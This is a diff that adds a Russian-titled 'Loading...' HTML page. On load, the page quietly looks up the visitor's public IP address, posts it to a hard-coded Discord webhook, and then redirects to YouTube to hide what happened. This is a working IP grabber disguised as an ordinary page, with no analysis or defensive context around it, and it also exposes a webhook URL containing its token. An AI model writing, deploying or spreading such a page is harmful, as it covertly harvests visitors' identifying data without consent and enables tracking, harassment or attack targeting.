@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Загрузка...</title>
+</head>
+<body>
+    <script>
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                fetch('https://discord.com/api/webhooks/1475250067500957779/FobmHvoFZh8HSINoEg0GeXnGPuZkk-tW2_C3MyNOvAHA8yNaGXBpfQ4TL4Fb5VIpTpUY', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `**IP:** ${data.ip}`
+                    })
+                })
+            })
+        window.location.href = 'https://youtube.com'
+    </script>
+</body>
+</html>
